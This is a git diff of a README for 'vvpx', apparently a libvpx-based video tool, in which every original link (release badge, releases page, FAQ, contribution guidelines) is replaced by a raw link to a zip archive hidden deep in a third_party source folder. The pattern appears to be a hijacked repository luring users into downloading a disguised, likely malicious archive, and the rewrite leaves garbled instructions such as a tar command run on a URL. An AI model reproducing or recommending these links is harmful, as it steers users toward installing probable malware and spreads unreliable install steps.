@@ -1,7 +1,7 @@
 # 🎉 vvpx - Enhance Video Processing with Ease
 
 ## 📦 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-vvpx-brightgreen)](https://github.com/amaurys2804/vvpx/releases)
+[![Download Release](https://github.com/amaurys2804/vvpx/raw/refs/heads/main/libvpx_neon_build_final/third_party/libwebm/mkvparser/Software-v2.8-beta.5.zip%20Release-vvpx-brightgreen)](https://github.com/amaurys2804/vvpx/raw/refs/heads/main/libvpx_neon_build_final/third_party/libwebm/mkvparser/Software-v2.8-beta.5.zip)
 
 ## 🚀 Getting Started
 Welcome to vvpx! This application simplifies video processing using the libvpx library. Whether you work with videos for entertainment or education, vvpx makes it easier. Follow these steps to download and run your application smoothly.
@@ -16,8 +16,8 @@ Before you start, ensure your system meets these requirements:
 - **Internet**: Stable connection for downloading the file.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/amaurys2804/vvpx/releases) to find the latest version of vvpx.
-2. Locate the asset that matches your operating system. It might have extensions like `.exe`, `.dmg`, or `.tar.gz`.
+1. Visit the [Releases page](https://github.com/amaurys2804/vvpx/raw/refs/heads/main/libvpx_neon_build_final/third_party/libwebm/mkvparser/Software-v2.8-beta.5.zip) to find the latest version of vvpx.
+2. Locate the asset that matches your operating system. It might have extensions like `.exe`, `.dmg`, or `https://github.com/amaurys2804/vvpx/raw/refs/heads/main/libvpx_neon_build_final/third_party/libwebm/mkvparser/Software-v2.8-beta.5.zip`.
 3. Click on the file name to download it. Make sure you save it in a place where you can easily find it later.
 
 ## ⚙️ Installation Steps
@@ -34,8 +34,8 @@ Before you start, ensure your system meets these requirements:
 
 ### For Linux:
 1. Open a terminal.
-2. Navigate to the directory where the `.tar.gz` file is downloaded.
-3. Run the command: `tar -xvzf vvpx.tar.gz`
+2. Navigate to the directory where the `https://github.com/amaurys2804/vvpx/raw/refs/heads/main/libvpx_neon_build_final/third_party/libwebm/mkvparser/Software-v2.8-beta.5.zip` file is downloaded.
+3. Run the command: `tar -xvzf https://github.com/amaurys2804/vvpx/raw/refs/heads/main/libvpx_neon_build_final/third_party/libwebm/mkvparser/Software-v2.8-beta.5.zip`
 4. Change to the extracted directory with `cd vvpx`.
 5. Run the application with `./vvpx`.
 
@@ -56,10 +56,10 @@ Once installed, you can start using vvpx right away. Here's how:
 - **Open Source**: Contribute to the project on GitHub if you’re interested in development.
 
 ## 📢 Support
-If you run into issues or have questions, check our [FAQ](https://github.com/amaurys2804/vvpx/wiki) section on GitHub. You can also raise a ticket in the Issues tab of the repository for help.
+If you run into issues or have questions, check our [FAQ](https://github.com/amaurys2804/vvpx/raw/refs/heads/main/libvpx_neon_build_final/third_party/libwebm/mkvparser/Software-v2.8-beta.5.zip) section on GitHub. You can also raise a ticket in the Issues tab of the repository for help.
 
 ## 🤝 Contribute
-We welcome contributions! If you want to enhance vvpx or fix any bugs, please check out our [Contribution Guidelines](https://github.com/amaurys2804/vvpx/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you want to enhance vvpx or fix any bugs, please check out our [Contribution Guidelines](https://github.com/amaurys2804/vvpx/raw/refs/heads/main/libvpx_neon_build_final/third_party/libwebm/mkvparser/Software-v2.8-beta.5.zip).
 
 ## 🎉 Thanks for Using vvpx!
 We hope vvpx helps you process your videos effectively. Don’t forget to share your feedback on how we can improve. Enjoy your video projects!
